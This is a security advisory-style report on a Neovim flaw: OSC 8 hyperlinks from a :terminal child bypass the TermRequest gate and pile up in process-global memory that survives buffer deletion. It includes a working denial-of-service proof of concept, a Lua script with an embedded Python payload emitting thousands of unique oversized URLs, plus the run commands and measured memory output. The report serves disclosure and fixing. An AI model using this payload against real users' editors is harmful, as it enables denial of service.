# OSC 8 hyperlinks bypass TermRequest gating into process-global memory

## Broken invariant

Passive OSC 8 hyperlink metadata from an untrusted `:terminal` child should stay bounded and scoped to that terminal buffer. Closing the terminal buffer should drop the child-controlled hyperlink state instead of retaining it in process-global tables.

Today that invariant is broken. `terminal.c` special-cases OSC 8 outside the normal `TermRequest` gate, parses the URI, and interns every distinct URL into the global highlight URL set. Those URL strings are only freed during a global highlight-table reset or process teardown, not when the terminal buffer is deleted.

## Input -> normalization -> policy gate -> sink

1. **Input**: a program running inside `:terminal` emits many unique OSC 8 hyperlinks, e.g. `ESC ] 8 ;; <unique long URL> ESC \ X ESC ] 8 ;; ESC \`.
2. **Normalization**:
   - libvterm enters OSC string mode after the first `;` and delivers payload fragments to Neovim (`src/nvim/vterm/parser.c:283-325`).
   - `on_osc()` reconstructs the OSC body in `term->termrequest_buffer` and calls `parse_osc8()` on the final payload (`src/nvim/terminal.c:349-381`).
   - `parse_osc8()` skips the OSC 8 params before the first `;` and treats the remaining bytes as the URL (`src/nvim/terminal.c:319-346`).
3. **Policy gate**: OSC 8 bypasses the only `TermRequest` gate. `on_osc()` returns early for other OSCs when no `TermRequest` handler exists, but explicitly keeps processing command `8` even in the default configuration (`src/nvim/terminal.c:358-370`).
4. **Sink**:
   - `hl_add_url()` interns the attacker-controlled URL into the global `urls` set with `xstrdup(url)` and creates a distinct highlight attribute entry (`src/nvim/highlight.c:43`, `src/nvim/highlight.c:77-126`, `src/nvim/highlight.c:509-517`).
   - Those URLs are only released by `clear_hl_tables()` during a global highlight reset or teardown, not on terminal-buffer close (`src/nvim/highlight.c:579-610`).
   - In the TUI/remote-UI path, the same stored URL is duplicated again and re-emitted as OSC 8 (`src/nvim/tui/tui.c:910-920`, `src/nvim/tui/tui.c:1517-1529`, `src/nvim/ui_client.c:228-230`).

## Minimal reproducer

### Reproducer file

```lua
local uv = vim.uv
local function rss()
  return uv.resident_set_memory()
end

local before = rss()

vim.cmd('enew')

local payload = [[
import sys
N = 2000
PAD = 'A' * 16384
for i in range(N):
    url = f'https://example.invalid/{i}/' + PAD
    sys.stdout.write(f'\x1b]8;;{url}\x1b\\X\x1b]8;;\x1b\\\n')
sys.stdout.flush()
]]

local job = vim.fn.termopen({ 'python3', '-c', payload })
vim.wait(20000, function()
  return vim.fn.jobwait({ job }, 0)[1] ~= -1
end)

vim.cmd('sleep 500m')
collectgarbage('collect')
local after = rss()

vim.cmd('bdelete!')
vim.cmd('sleep 500m')
collectgarbage('collect')
local after_close = rss()

print(string.format('rss_before=%d', before))
print(string.format('rss_after=%d', after))
print(string.format('rss_after_close=%d', after_close))

vim.cmd('qa!')
```

### Commands

```bash
cat > /tmp/osc8_dos.lua <<'EOF'
local uv = vim.uv
local function rss()
  return uv.resident_set_memory()
end

local before = rss()

vim.cmd('enew')

local payload = [[
import sys
N = 2000
PAD = 'A' * 16384
for i in range(N):
    url = f'https://example.invalid/{i}/' + PAD
    sys.stdout.write(f'\x1b]8;;{url}\x1b\\X\x1b]8;;\x1b\\\n')
sys.stdout.flush()
]]

local job = vim.fn.termopen({ 'python3', '-c', payload })
vim.wait(20000, function()
  return vim.fn.jobwait({ job }, 0)[1] ~= -1
end)

vim.cmd('sleep 500m')
collectgarbage('collect')
local after = rss()

vim.cmd('bdelete!')
vim.cmd('sleep 500m')
collectgarbage('collect')
local after_close = rss()

print(string.format('rss_before=%d', before))
print(string.format('rss_after=%d', after))
print(string.format('rss_after_close=%d', after_close))

vim.cmd('qa!')
EOF

/home/node/.nix-profile/bin/nvim --headless -u NONE -S /tmp/osc8_dos.lua
```

### Expected

- Hidden OSC 8 metadata should not create unbounded process-global state.
- After `:bdelete!`, memory attributable to the terminal child's hyperlinks should be released or at least return close to the pre-terminal baseline.

### Actual

On this box with `nvim v0.12.1`, the above command printed:

```text
rss_before=12804096
rss_after=53575680
rss_after_close=53575680
```

So roughly 40 MB of additional resident memory remained after the terminal buffer was deleted and GC was forced.

For comparison, a plain-output control with the same 2000 visible `X\n` lines but **no** OSC 8 only reached about 17 MB RSS after close on this box, and a control that reused the **same** large OSC 8 URL only reached about 22 MB. The extra retained growth tracks unique attacker-controlled URLs being interned globally, not ordinary terminal output.

## Affected files

- `src/nvim/vterm/parser.c:283-325` — normalizes OSC strings and hands payload fragments to Neovim.
- `src/nvim/terminal.c:319-346` — `parse_osc8()` turns the post-parameter OSC 8 payload into a URL string with no bounds or lifetime policy.
- `src/nvim/terminal.c:349-381` — `on_osc()` reconstructs OSC payloads and special-cases command `8` outside the `TermRequest` gate.
- `src/nvim/highlight.c:43` — global `urls` set.
- `src/nvim/highlight.c:77-126` — each unique URL also creates a new highlight attribute entry.
- `src/nvim/highlight.c:509-517` — `hl_add_url()` interns the URL with `xstrdup(url)`.
- `src/nvim/highlight.c:579-610` — URL storage is only released by global highlight-table clearing/teardown.
- `src/nvim/tui/tui.c:910-920` — TUI re-emits stored URLs as OSC 8.
- `src/nvim/tui/tui.c:1517-1529` — TUI duplicates URLs into its own URL set.
- `src/nvim/ui_client.c:228-230` — UI client path duplicates URLs again for attached UIs.

## History / variant signal

The task brief already pointed at the distinction between generic `TermRequest` emission and OSC 8 hyperlink handling. Recent upstream fixes concentrated on pending-`TermRequest` lifetime bugs; the OSC 8 fast path is the sibling boundary where child-controlled terminal bytes still become privileged editor/UI state without the usual event gate.

## Impact / severity

This is a default-reachable local DoS in a core terminal surface.

Any untrusted program whose output is viewed inside `:terminal` — including remote shells, build logs, or text viewers on hostile content — can force Neovim to retain arbitrarily many unique, arbitrarily large hidden hyperlink URLs in process-global highlight state. No plugin, no `TermRequest` autocommand, and no user click is required.

Because the stored URLs outlive the terminal buffer, repeated exposure can ratchet memory upward until the editor becomes sluggish or OOM-killed. Interactive TUI or remote-UI sessions are worse than the headless reproducer above because the same URLs are duplicated again in UI-side tables and re-emitted as OSC 8. I would rate this as **medium severity**: it is not direct code execution, but it is a verified, default-on boundary bug that lets untrusted terminal output promote hidden metadata into persistent process-global memory and cause reproducible editor denial of service.
